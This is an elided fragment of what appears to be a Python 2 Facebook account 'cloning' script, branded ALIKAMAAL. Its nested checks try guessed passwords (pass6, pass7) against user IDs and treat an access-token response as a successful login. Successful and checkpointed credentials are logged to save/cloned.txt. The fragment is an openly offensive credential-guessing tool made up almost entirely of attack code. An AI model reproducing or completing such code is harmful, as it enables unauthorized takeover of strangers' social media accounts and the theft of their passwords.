...
\033[1;94mFACEBOOK  ALIKAMAAL
                  
\033[1;92mFB PAGE   ALIKAMAAL
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass6
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass6 
                                    cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass7
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass7 
                                    cps = open('save/cloned.txt', 'a')
